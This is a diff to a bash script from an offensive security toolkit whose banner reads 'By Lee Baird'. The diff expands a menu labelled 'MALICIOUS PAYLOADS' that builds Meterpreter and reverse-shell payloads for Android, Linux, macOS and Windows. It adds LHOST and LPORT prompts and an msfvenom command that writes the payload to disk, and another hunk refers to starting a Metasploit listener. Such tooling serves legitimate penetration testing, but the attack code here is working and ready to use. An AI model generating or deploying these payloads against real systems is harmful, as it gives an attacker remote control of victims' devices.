@@ -41,30 +41,30 @@ if [[ `uname` == 'Darwin' ]]; then
      browser=Safari
      ip=$(ifconfig | grep -B3 'status: active' | grep 'broadcast' | cut -d ' ' -f2)
      interface=$(ifconfig | grep $ip -B3 | grep 'UP' | cut -d ':' -f1)
-	 msf=/opt/metasploit-framework/bin/msfconsole
-	 msfv=/opt/metasploit-framework/bin/msfvenom
-	 port=4444
-	 web="open -a Safari"
+	msf=/opt/metasploit-framework/bin/msfconsole
+	msfv=/opt/metasploit-framework/bin/msfvenom
+	port=4444
+	web="open -a Safari"
 else
      browser=Firefox
      ip=$(ip addr | grep 'global' | cut -d '/' -f1 | awk '{print $2}')
      interface=$(ip link | awk '{print $2, $9}' | grep 'UP' | cut -d ':' -f1)
-	 msf=msfconsole
-	 msfv=msfvenom
-	 port=443
-	 web="firefox -new-tab"
+	msf=msfconsole
+	msfv=msfvenom
+	port=443
+	web="firefox -new-tab"
 fi
 
 ##############################################################################################################
 
 f_banner(){
 echo
-echo "
+echo -e "\x1B[1;33m
 ______  ___ ______ ______  _____  _    _ ______  _____
 |     \  |  |____  |      |     |  \  /  |_____ |____/
 |_____/ _|_ _____| |_____ |_____|   \/   |_____ |    \_
 
-By Lee Baird"
+By Lee Baird\x1B[0m"
 echo
 echo
 }
@@ -3490,42 +3490,75 @@ fi
 f_payload(){
 clear
 f_banner
-echo -e "\x1B[1;34mPayloads:\x1B[0m"
+echo -e "\x1B[1;34mMALICIOUS PAYLOADS\x1B[0m"
+echo
 echo "1.  android/meterpreter/reverse_tcp"
-echo "2.  windows/meterpreter/reverse_tcp"
+echo "2   linux/x64/shell_reverse_tcp"
+echo "3.  linux/x86/meterpreter/reverse_tcp"
+echo "4.  osx/x64/shell_reverse_tcp"
+echo "5.  windows/meterpreter/reverse_tcp"
+echo "6.  windows/x64/meterpreter/reverse_tcp"
+echo "7.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
 
-# Check for choice.
-if [[ $choice -lt 1 || $choice -gt 2 ]]; then
-	f_error
+case $choice in
+     1) payload="android/meterpreter/reverse_tcp"
+	   extention="apk"
+        format="raw"
+        arch="dalvik"
+	   platform="android";;
+     2) payload="linux/x64/shell_reverse_tcp"
+        extention="elf"
+        format="elf"
+        arch="x86_64"
+	   platform="linux";;
+     3) payload="linux/x86/meterpreter/reverse_tcp"
+        extention="elf"
+        format="elf"
+        arch="x86"
+	   platform="linux";;
+     4) payload="osx/x64/shell_reverse_tcp"
+	   extention="macho"
+	   format="macho"
+        arch="x86_64"
+	   platform="osx";;
+     5) payload="windows/meterpreter/reverse_tcp"
+	   extention="exe"
+	   format="exe"
+        arch="x86"
+	   platform="windows";;
+     6) payload="windows/x64/meterpreter/reverse_tcp"
+	   extention="exe"
+	   format="exe"
+        arch="x86_64"
+	   platform="windows";;
+     7) f_main;;
+     *) f_error;;
+esac
+
+echo
+echo -n "LHOST: "
+read lhost
+
+# Check for no answer
+if [[ -z $lhost ]]; then
+     lhost=$ip
+     echo "Using $ip"
+     echo
 fi
 
-if [ "$choice" == "1" ]; then
-	payload="android/meterpreter/reverse_tcp"
-	format="raw"
-     arch="dalvik"
-	platform="android"
-	extention="apk"
-else
-	payload="windows/meterpreter/reverse_tcp"
-	format="exe"
-     arch="x86"
-	platform="windows"
-	extention="exe"
-fi
-
-echo -n "Local port: "
-read port
+echo -n "LPORT: "
+read lport
 
 # Check for valid port number.
-if [[ $port -lt 1 || $port -gt 65535 ]]; then
+if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
 	f_error
 fi
 
 echo
-$msfv -p $payload LHOST=$ip LPORT=$port -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch.$extention
+$msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch.$extention
 echo
 echo
 exit
@@ -3555,7 +3588,7 @@ fi
 
 echo
 echo "Starting a Metasploit listener on port $port."
-echo "Type - Windows meterpreter reverse TCP."
+echo "Type - Windows Meterpreter reverse TCP."
 echo
 echo "This takes about 20 seconds."
 echo
